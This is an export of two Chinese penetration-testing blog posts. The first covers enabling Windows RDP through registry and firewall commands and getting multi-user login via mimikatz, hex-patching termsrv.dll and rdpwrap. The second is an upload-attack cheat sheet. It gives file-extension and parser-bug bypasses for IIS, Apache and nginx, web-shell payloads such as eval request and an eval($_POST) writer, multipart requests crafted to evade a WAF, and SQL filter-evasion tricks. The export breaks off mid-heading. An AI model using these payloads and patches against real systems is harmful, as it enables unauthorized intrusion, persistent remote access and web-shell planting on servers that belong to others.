[{"title":"渗透技巧之Windows系统远程桌面的多用户登录","url":"http://www.chabug.org/2017/12/24/windows-users-login/","content":"<h1 id=\"0x00-前言\"><a href=\"#0x00-前言\" class=\"headerlink\" title=\"0x00 前言\"></a>0x00 前言</h1><hr>\n<p>在渗透测试中，经常会接触Windows服务器的远程桌面服务，通过界面对服务器进行管理。而对于普通的Windows系统，在某些条件下也需要进行界面操作。</p>\n<p>虽然我们可以通过编写程序来实现界面操作（捕获桌面信息，压缩传输，发送鼠标键盘消息等），但是如果能够使用远程桌面服务，岂不是更加方便高效</p>\n<p>那么，对应非服务器版本的Windows系统，在使用远程桌面服务有哪些需要注意的问题呢，本文将会逐个分析介绍。</p>\n<h1 id=\"0x01-简介\"><a href=\"#0x01-简介\" class=\"headerlink\" title=\"0x01 简介\"></a>0x01 简介</h1><hr>\n<p>本文将要介绍如下内容：</p>\n<ul>\n<li>开启远程桌面的方法</li>\n<li>使用mimikatz支持远程桌面多用户的原理</li>\n<li>改进思路</li>\n<li>测试工具rdpwrap<h1 id=\"0x02-开启远程桌面的方法\"><a href=\"#0x02-开启远程桌面的方法\" class=\"headerlink\" title=\"0x02 开启远程桌面的方法\"></a>0x02 开启远程桌面的方法</h1></li>\n</ul>\n<hr>\n<p>1、查询系统是否允许3389远程连接<br><code>REG QUERY &quot;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server&quot; /v fDenyTSConnections</code><br>1表示关闭，0表示开启</p>\n<p>查看远程连接的端口：</p>\n<p><code>REG QUERY &quot;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp&quot; /v PortNumber</code><br>端口格式为16进制，如下图<br><img src=\"http://ww1.sinaimg.cn/large/006xriynly1fmrtc0z9x1j30hz021jr8.jpg\" alt=\"\"></p>\n<p>0xd3d转换为十进制为33389</p>\n<p>2、本机开启3389远程连接的方法<br>方法1：通过cmd<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">REG ADD &quot;HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</div><div class=\"line\">REG ADD &quot;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp&quot; /v PortNumber /t REG_DWORD /d 0x00000d3d /f</div></pre></td></tr></table></figure></p>\n<p>方法2：通过reg文件<br>内容如下：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\">Windows Registry Editor Version 5.00</div><div class=\"line\">[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server]</div><div class=\"line\">&quot;fDenyTSConnections&quot;=dword:00000000</div><div class=\"line\">[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp]</div><div class=\"line\">&quot;PortNumber&quot;=dword:00000d3d</div></pre></td></tr></table></figure></p>\n<p>导入注册表：</p>\n<p><code>regedit /s a.reg</code><br><strong>注：</strong></p>\n<p>如果修改连接端口，系统重启后才能生效</p>\n<p><strong>补充</strong></p>\n<p>如果系统未配置过远程桌面服务，第一次开启时还需要添加防火墙规则允许3389端口，如下图</p>\n<p><img src=\"https://ws1.sinaimg.cn/large/006xriynly1fmrtecyznrj30bd0bxq3m.jpg\" alt=\"\"></p>\n<p>修改防火墙配置，允许3389端口的命令如下:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow</div></pre></td></tr></table></figure></p>\n<p>3、远程连接方法<br>kali使用3389远程连接：</p>\n<p><code>rdesktop 192.168.1.1:3389</code><br>Windows：</p>\n<p><code>mstsc.exe</code></p>\n<h1 id=\"0x03-非服务器版本的Windows系统默认只允许一个账户登录\"><a href=\"#0x03-非服务器版本的Windows系统默认只允许一个账户登录\" class=\"headerlink\" title=\"0x03 非服务器版本的Windows系统默认只允许一个账户登录\"></a>0x03 非服务器版本的Windows系统默认只允许一个账户登录</h1><hr>\n<p>具体表现为：</p>\n<p>远程登录时，使用与原系统相同的账户，原系统将被切换到登录界面</p>\n<p>如下图</p>\n<p><img src=\"https://ws1.sinaimg.cn/large/006xriynly1fmrtfsadxyj30ph0gswkf.jpg\" alt=\"\"></p>\n<p>使用不同的账户，登录时提示其他用户已登录到此计算机，如下图</p>\n<p><img src=\"https://ws1.sinaimg.cn/large/006xriynly1fmrtga5tymj30n009f0tf.jpg\" alt=\"\"></p>\n<p>选择继续后，原系统桌面将弹框提示是否断开当前连接(30秒后默认选择同意，退回到登录界面)</p>\n<p>如下图</p>\n<p><img src=\"https://ws1.sinaimg.cn/large/006xriynly1fmrtgokzl0j30ez0budh4.jpg\" alt=\"\"></p>\n<h1 id=\"0x04-非服务器版本的Windows系统支持多用户登录的方法\"><a href=\"#0x04-非服务器版本的Windows系统支持多用户登录的方法\" class=\"headerlink\" title=\"0x04 非服务器版本的Windows系统支持多用户登录的方法\"></a>0x04 非服务器版本的Windows系统支持多用户登录的方法</h1><hr>\n<p>1、使用mimikatz<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">privilege::debug</div><div class=\"line\">ts::multirdp</div></pre></td></tr></table></figure></p>\n<p>执行如下图</p>\n<p><img src=\"https://ws1.sinaimg.cn/large/006xriynly1fmrthosuxej30jt07nt95.jpg\" alt=\"\"></p>\n<p>开启多用户登录功能，最高支持到Win7</p>\n<p><strong>使用与原系统相同的账户，原系统还是会被切换到登录界面</strong></p>\n<p>使用与原系统不同的账户，登录成功，如下图</p>\n<p><img src=\"https://ws1.sinaimg.cn/large/006xriynly1fmrti6qum5j30p20jkacb.jpg\" alt=\"\"></p>\n<p>通过查看mimikatz的源码找到修改思路，代码位置如下：</p>\n<p><a href=\"https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kuhl_m_ts.c\" target=\"_blank\" rel=\"external\">https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kuhl_m_ts.c</a></p>\n<p>Windows在开启服务Remote Desktop Services时，会加载termsrv.dll，如下图</p>\n<p><img src=\"https://ws1.sinaimg.cn/large/006xriynly1fmrtire5gqj30ne081myj.jpg\" alt=\"\"></p>\n<p>通过修改内存中的termsrv.dll实现开启多用户功能，具体操作如下：</p>\n<p>Win7 x86：</p>\n<p>查找:<code>0x3B86200300000F84</code></p>\n<p>替换为:<code>0xC78620030000FFFFFF7F9090</code></p>\n<p>Win7 x64：</p>\n<p>查找:<code>0x39873C0600000F84</code></p>\n<p>替换为:<code>0xC7873C060000FFFFFF7F9090</code></p>\n<p>当然，该方法在系统重启后失效</p>\n<p>更近一步，如果我们直接修改文件termsrv.dll，能否实现永久开启多用户登录的功能呢？</p>\n<p>继续接下来的测试</p>\n<p>2、修改termsrv.dll<br>推荐工具： CFF Explorer</p>\n<p>测试系统： Win7 x64</p>\n<p>打开<code>c：\\windows\\system32</code>下的termsrv.dll</p>\n<p>Hex Editor</p>\n<p>查看十六进制数据<code>39873C0600000F84</code></p>\n<p>如下图</p>\n<p><img src=\"https://ws1.sinaimg.cn/large/006xriynly1fmrtk1vcrwj30o90eqwgd.jpg\" alt=\"\"></p>\n<p>从<code>0x0001738A</code>处开始，选中12字节，替换为<code>C7873C060000FFFFFF7F9090</code></p>\n<p>保存dll</p>\n<p>注：</p>\n<p>需要先停止远程桌面服务才能替换termsrv.dll</p>\n<p>替换termsrv.dll后，重新开启服务TermService</p>\n<p>尝试使用不同用户远程连接，成功，验证该思路正确</p>\n<p>完整操作如下：</p>\n<p>1.查看Remote Desktop Services服务状态</p>\n<p><code>sc qc TermService</code><br>2.如果服务启动，需要先关闭</p>\n<p><code>net stop TermService /y</code><br>3.删除原termsrv.dll</p>\n<p><code>del c:\\windows\\system32\\termsrv.dll</code><br>4.替换新termsrv.dll</p>\n<p>5.启动服务</p>\n<p><code>net start TermService</code><br>6.远程连接</p>\n<p>成功实现多用户登录</p>\n<p>补充1：</p>\n<p>Win7 x86：</p>\n<p>查找:<code>0x3B86200300000F84</code></p>\n<p>替换为:<code>0xC78620030000FFFFFF7F9090</code></p>\n<p>补充2</p>\n<p>常见Windows系统的版本号：</p>\n<p>系统    版本号<br>Win7    6.1.7600<br>Win7sp1    6.1.7601<br>Win8    6.2.9200<br>Win8.1    6.3.9600<br>3、使用工具rdpwrap<br>工程地址：</p>\n<p><a href=\"https://github.com/stascorp/rdpwrap\" target=\"_blank\" rel=\"external\">https://github.com/stascorp/rdpwrap</a></p>\n<p>工具地址：</p>\n<p><a href=\"https://github.com/stascorp/rdpwrap/releases\" target=\"_blank\" rel=\"external\">https://github.com/stascorp/rdpwrap/releases</a></p>\n<p>支持Win Vista - Win 10</p>\n<p>不修改termsrv.dll，通过传入不同参数实现</p>\n<p>安装：</p>\n<p><code>RDPWInst.exe -i is</code><br>测试如下图</p>\n<p><img src=\"https://ws1.sinaimg.cn/large/006xriynly1fmrtlm84lnj30hy0gu0ta.jpg\" alt=\"\"></p>\n<p>释放rdpwrap.dll和rdpwrap.ini至System32文件夹</p>\n<p>rdpwrap.dll会被加载到同termsrv.dll相同的进程</p>\n<p>此时，能够使用不同用户进行远程连接</p>\n<p>卸载：</p>\n<p><code>RDPWInst.exe -u</code><br>0x05 小结<br>本文介绍了三种支持远程桌面多用户登录的方法，适用于不同条件，对于替换termsrv.dll的方法，需要根据系统具体版本，使用不同的替换位置</p>\n","categories":[],"tags":[]},{"title":"总结一下上传攻击","url":"http://www.chabug.org/2017/12/23/upload-attack/","content":"<h1 id=\"0x01-常规上传突破\"><a href=\"#0x01-常规上传突破\" class=\"headerlink\" title=\"0x01 常规上传突破\"></a>0x01 常规上传突破</h1><p><strong>常见扩展名黑名单</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">asp|asa|cer|cdx|aspx|ashx|ascx|asax </div><div class=\"line\">php|php2|php3|php4|php5|asis|htaccess </div><div class=\"line\">htm|html|shtml|pwml|phtml|phtm|js|jsp </div><div class=\"line\">vbs|asis|sh|reg|cgi|exe|dll|com|bat|pl|cfc|cfm|ini</div></pre></td></tr></table></figure></p>\n<p><strong>特殊后缀</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">jsp jspx jspf</div><div class=\"line\">asp asa cer aspx   [IETester]</div><div class=\"line\">php php php3 php4 pphphp</div><div class=\"line\">exe exee</div></pre></td></tr></table></figure></p>\n<p><strong>绕过</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\">[*] [00][80]        截断 iconv截断</div><div class=\"line\">[*] js              burpsuite绕过</div><div class=\"line\">[*] mime类型         content-type  校验常见的 image/jpeg image/png</div><div class=\"line\">[*] 图片检测         getimagesize  合成图马上传即可 copy 1.jpg/b + poc.txt 2.jpg</div><div class=\"line\">[*] 扩展名           黑名单  系统特性和特殊文件名容易绕过</div><div class=\"line\">                    白名单  文件包含或者解析漏洞绕过  重命名限制脚本执行权限难解</div><div class=\"line\">[*] 目录路径         突破上级目录和同级目录限制 uploads/../1.php   uploads/../x/1.php</div><div class=\"line\">[*] .htaccess       上传覆盖绕过</div></pre></td></tr></table></figure></p>\n<blockquote>\n<p>轻量级检测绕过攻击</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">[*] 绕过 javascript对扩展名的检测                      </div><div class=\"line\">[*] 绕过服务端对http request包   MIME类型检测</div></pre></td></tr></table></figure>\n<blockquote>\n<p>路径/扩展名检测绕过攻击<br><strong>黑名单绕过</strong></p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div></pre></td><td class=\"code\"><pre><div class=\"line\">[*] 文件名大小写绕过                 </div><div class=\"line\">[*] 名单列表绕过                    </div><div class=\"line\">[*] 特殊文件名绕过                  </div><div class=\"line\">[*] 0x00  截断绕过                  </div><div class=\"line\">[*] .htaccess绕过           </div><div class=\"line\">[*] 文件包含漏洞                 </div><div class=\"line\">[*] Apache解析漏洞                </div><div class=\"line\">[*] IIS解析漏洞                   </div><div class=\"line\">[*] Nginx解析漏洞</div></pre></td></tr></table></figure>\n<blockquote>\n<p><strong>白名单绕过</strong></p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">[*] 0x00截断绕过                     </div><div class=\"line\">[*] php 文件包含漏洞                  </div><div class=\"line\">[*] IIS 解析漏洞                      </div><div class=\"line\">[*] Nginx解析漏洞</div></pre></td></tr></table></figure>\n<blockquote>\n<p><strong>文件内容</strong>检测绕过攻击</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div></pre></td><td class=\"code\"><pre><div class=\"line\">[*] 文件加载绕过      二次渲染和ImageMagick基本没戏              </div><div class=\"line\"> </div><div class=\"line\">    function image_gd_open($file, $extension)   //后台GD库二次渲染的代码</div><div class=\"line\">    &#123;</div><div class=\"line\">    $extension = str_replace(&apos;jpg&apos;, &apos;jpeg&apos;, $extension);</div><div class=\"line\">    $open_func = &apos;imageCreateFrom&apos;. $extension; //函数名变成 imageCreateFrompng 之类</div><div class=\"line\">    if (!function_exists($open_func))</div><div class=\"line\">    &#123;</div><div class=\"line\">    return FALSE;</div><div class=\"line\">    &#125;</div><div class=\"line\">    return $open_func($file); //变成 imagecreatefrompng(&apos;/tmp/php0lbTOn&apos;)</div><div class=\"line\">    &#125;</div><div class=\"line\">将上传的文件中属于图片部分的数据抓取，再使用API或者函数重新将图片生成保存</div></pre></td></tr></table></figure>\n<p><strong>系统特性</strong></p>\n<blockquote>\n<p>Windows特殊字符</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\">1.php[%80-%99]  当然还有php的iconv函数的80截断</div><div class=\"line\">1.asp.</div><div class=\"line\">1.asp [空格]</div><div class=\"line\">1.php:1.jpg    1.&lt;&lt;&lt;  </div><div class=\"line\">1.php::$DATA</div><div class=\"line\">1.php::$DATA……[256]</div></pre></td></tr></table></figure>\n<blockquote>\n<p>Linux大小写敏感</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">1.Php  1.pHp  1.phP</div></pre></td></tr></table></figure>\n<h1 id=\"0x02-IIS5-x-6-x解析漏洞\"><a href=\"#0x02-IIS5-x-6-x解析漏洞\" class=\"headerlink\" title=\"0x02 IIS5.x-6.x解析漏洞\"></a>0x02 IIS5.x-6.x解析漏洞</h1><p><strong>目录解析(6.0)</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">1.asa/1.jpg </div><div class=\"line\">1.asp/1.jpg </div><div class=\"line\">1.cer/1.jpg</div></pre></td></tr></table></figure></p>\n<p><strong>文件解析</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">1.asa;1.jpg </div><div class=\"line\">1.asp;1.jpg </div><div class=\"line\">1.cer;1.jpg</div></pre></td></tr></table></figure></p>\n<p><strong>特殊后缀</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">1.asa</div><div class=\"line\">1.cer</div><div class=\"line\">1.cdx</div></pre></td></tr></table></figure></p>\n<p>re :文件解析/截断等 重命名无解</p>\n<h1 id=\"0x03-Apache解析漏洞\"><a href=\"#0x03-Apache解析漏洞\" class=\"headerlink\" title=\"0x03 Apache解析漏洞\"></a>0x03 Apache解析漏洞</h1><p><code>1.php.Axiba</code></p>\n<p><strong>Apache配置文件</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div></pre></td><td class=\"code\"><pre><div class=\"line\">.htaccess突破</div><div class=\"line\"> </div><div class=\"line\">    &lt;FilesMatch &quot;1.jpg&quot;&gt;</div><div class=\"line\">     </div><div class=\"line\">    SetHandler application/x-httpd-php</div><div class=\"line\">    &lt;/FilesMatch&gt;    上传1.jpg即可</div><div class=\"line\"> </div><div class=\"line\">Apache的conf配置</div><div class=\"line\">    AddHandler php5-script .php </div><div class=\"line\">        文件名里包含.php,即使文件名是test.php.jpg 也会以php 来执行</div><div class=\"line\">     </div><div class=\"line\">    AddType application/x-httpd-php .jpg</div><div class=\"line\">        扩展名是jpg，一样能以php方式执行</div></pre></td></tr></table></figure></p>\n<h1 id=\"0x04-nginx解析漏洞\"><a href=\"#0x04-nginx解析漏洞\" class=\"headerlink\" title=\"0x04 nginx解析漏洞\"></a>0x04 nginx解析漏洞</h1><p><strong>空字节代码执行漏洞</strong>  </p>\n<p><strong>Nginx 0.5. Nginx 0.6. Nginx 0.7 &lt;= 0.7.65 Nginx 0.8 &lt;= 0.8.37</strong></p>\n<p><code>1.jpg%00.php</code><br><strong>Nginx 0.8.41 – 1.5.6</strong></p>\n<p><code>1.jpg%20%00.php</code><br><strong>IIS 7.0/ Nginx &lt;8.03畸形解析漏洞</strong></p>\n<p><code>&lt;?PHP fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php eval($_POST[cmd])?&gt;&#39;);?&gt;\nweb访问1.jpg/.php,当前目录下会生成shell.php</code><br><strong>php-cgi解析漏洞</strong><br><strong>Win2k8 + IIS7.0 + PHP [IIS 7.0/7.5 Nginx &lt; 0.8.3]</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\">-----------------------------1315172757593483281034936488</div><div class=\"line\">Content-Disposition: form-data; name=&quot;upfile&quot;; filename=&quot;1.php&quot;</div><div class=\"line\">Content-Type: text/plain</div><div class=\"line\">-----------------------------1315172757593483281034936488</div><div class=\"line\">Content-Disposition: form-data; name=&quot;upfile&quot;; filename=&quot;1.jpg&quot;</div><div class=\"line\">Content-Type: text/plain</div></pre></td></tr></table></figure></p>\n<p><strong>Win2k3 + IIS6.0 + ASP</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\">-----------------------------1315172757593483281034936488</div><div class=\"line\">Content-Disposition: form-data; name=&quot;upfile&quot;; </div><div class=\"line\">Content-Type: text/plain</div><div class=\"line\">filename=&quot;1.asp&quot;</div><div class=\"line\"> </div><div class=\"line\">&lt;%eval request(&quot;1&quot;)%&gt;</div></pre></td></tr></table></figure></p>\n<h1 id=\"0x05-Bypass-WAF缺陷\"><a href=\"#0x05-Bypass-WAF缺陷\" class=\"headerlink\" title=\"0x05 Bypass-WAF缺陷\"></a>0x05 Bypass-WAF缺陷</h1><p><strong>匹配过于严谨：</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div></pre></td><td class=\"code\"><pre><div class=\"line\">1   Content-Type: multipart/form-data; boundary=</div><div class=\"line\">    [加个空格]---------------------------4714631421141173021852555099</div><div class=\"line\"> </div><div class=\"line\">2   boundary不一致</div><div class=\"line\">    Content-Type: multipart/form-data; </div><div class=\"line\">    boundary=---------------------------4714631421141173021852555099</div><div class=\"line\">    Content-Length: 253</div><div class=\"line\"> </div><div class=\"line\">    -----------------------------47146314211411730218525[改成别的]99</div><div class=\"line\">    Content-Disposition: form-data; name=&quot;file1&quot;; filename=&quot;shell.asp&quot;</div><div class=\"line\">    Content-Type: application/octet-stream</div><div class=\"line\"> </div><div class=\"line\">    &lt;%eval request(&quot;a&quot;)%&gt;</div><div class=\"line\">    -----------------------------4714631421141173021852555099--</div><div class=\"line\"> </div><div class=\"line\">3   ASCII &gt; 127的字符</div><div class=\"line\">    1.asp;[af截断].jpg</div><div class=\"line\"> </div><div class=\"line\">4   Content-Disposition长度[例如超过1M]字节[将垃圾数据放在数据包最开头]</div><div class=\"line\"> </div><div class=\"line\">5   长文件名 1.................[很长]..........................php</div><div class=\"line\">     </div><div class=\"line\">6   特殊的长文件名</div><div class=\"line\">    shell.asp;王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王.jpg </div><div class=\"line\"> </div><div class=\"line\">7   多个filename </div><div class=\"line\">    -----------------------------47146314211411730218525[改成别的]99</div><div class=\"line\">    Content-Disposition: form-data; name=&quot;file1&quot;; filename=&quot;1.asp&quot;;filename=&quot;1.jpg&quot;    [或者把filename放到content-type下面]</div><div class=\"line\">    Content-Type: application/octet-stream</div><div class=\"line\"> </div><div class=\"line\">8   POST/GET</div><div class=\"line\">    上传一个POST型的数据包，抓包将POST改为GET</div><div class=\"line\"> </div><div class=\"line\">9   删除实体里面的Conten-Type字段</div><div class=\"line\">    一.删除Content整行</div><div class=\"line\">    二.删除C后面的字符</div><div class=\"line\">    正常包：</div><div class=\"line\">        Content-Disposition: form-data; name=&quot;image&quot;; filename=&quot;1.png&quot;</div><div class=\"line\">        Content-Type: image/png</div><div class=\"line\">    构造包： </div><div class=\"line\">        Content-Disposition: form-data; name=&quot;image&quot;; filename=&quot;1.png </div><div class=\"line\">        C.php&quot;</div><div class=\"line\"> </div><div class=\"line\">10  文件名回车</div><div class=\"line\">    -----------------------------4714631421141173021852599</div><div class=\"line\">    Content-Disposition: form-data; name=&quot;file1&quot;; filename=&quot;shell.as</div><div class=\"line\">    p&quot;</div><div class=\"line\">    Content-Type: application/octet-stream   </div><div class=\"line\"> </div><div class=\"line\">11  删除Content-Disposition字段里的空格</div><div class=\"line\"> </div><div class=\"line\">12  修改Content-Disposition字段值的大小写</div><div class=\"line\">    -----------------------------4714631421141173021852599</div><div class=\"line\">    Content-Disposition: [大写F]orm-data; name=&quot;file1&quot;; filename=&quot;shell.asp&quot;</div><div class=\"line\">    Content-Type: application/octet-stream </div><div class=\"line\"> </div><div class=\"line\">13  Tab</div><div class=\"line\">    -----------------------------20566128503514</div><div class=\"line\">    Content-Disposition: form-data; name=&quot;uploaded&quot;; filename=[Tab]     &quot;e.php&quot;</div><div class=\"line\">    Content-Type: application/force-download</div><div class=\"line\"> </div><div class=\"line\">14  去空格</div><div class=\"line\">    -----------------------------20566128503514</div><div class=\"line\">    Content-Disposition: form-data;name=&quot;uploaded&quot;; filename=&quot;e.php&quot;</div><div class=\"line\">    Content-Type: application/force-download</div><div class=\"line\"> </div><div class=\"line\">15  form-data删掉</div><div class=\"line\">    -----------------------------20566128503514</div><div class=\"line\">    Content-Disposition: ;name=&quot;uploaded&quot;; filename=&quot;e.php&quot;</div><div class=\"line\">    Content-Type: application/force-download</div><div class=\"line\"> </div><div class=\"line\">16  加个符号</div><div class=\"line\">    -----------------------------20566128503514</div><div class=\"line\">    Content-Disposition: form-data;; name=&quot;uploaded&quot;; filename=&quot;e.php&quot;</div><div class=\"line\">    Content-Type: application/force-download</div></pre></td></tr></table></figure></p>\n<p><strong>顺便提下数据库</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div></pre></td><td class=\"code\"><pre><div class=\"line\">Mysql       1e1&#123;union from&#125;、\\nkeyword、&#123;+ - `` &apos;&apos; &quot;&quot; ~ ! @ () &#123;&#125; &#125;keyword</div><div class=\"line\">            10个可代替空格的字符、Error Return设计缺陷等 …</div><div class=\"line\"> </div><div class=\"line\">Mssql       30多个可代替空格的字符、Error Return设计缺陷等 …</div><div class=\"line\"> </div><div class=\"line\">Annotation  -- , # , -- + , // , -- - , /**/ , ;%00 , /*!20000*/</div><div class=\"line\"> </div><div class=\"line\">Apache      解析特性、HPP、畸形method、畸形Boundary等 …</div><div class=\"line\"> </div><div class=\"line\">Nginx       关注系统&amp;语言&amp;数据库特性&amp;解析特性等 …</div><div class=\"line\"> </div><div class=\"line\">OSX         test.php&#123;\\xFC[\\x80-\\x83]&#125;</div><div class=\"line\"> </div><div class=\"line\">Linux       host&apos;&apos;name</div><div class=\"line\"> </div><div class=\"line\">Windows&amp;IIS  </div><div class=\"line\">            Unicode、畸形Unicode、ADS流、N种HTTP畸形正文、</div><div class=\"line\">            解析特性、截断特性、HP、畸形Boundary、GET／POST傻傻分不清、</div><div class=\"line\">            无数畸形字符可以 代替正常字符等 …</div><div class=\"line\"> </div><div class=\"line\">Encoder     Json、Unicode、Base64、Url Encode、Html、Serialize、双重编码等 …</div><div class=\"line\"> </div><div class=\"line\">User-Agent  特殊放行  [google蜘蛛：Googlebot 百度蜘蛛：Baiduspider]</div></pre></td></tr></table></figure></p>\n<h1 id=\"0x06-总结\"><a href=\"#0x06-总结\" class=\"headerlink\" title=\"0x06 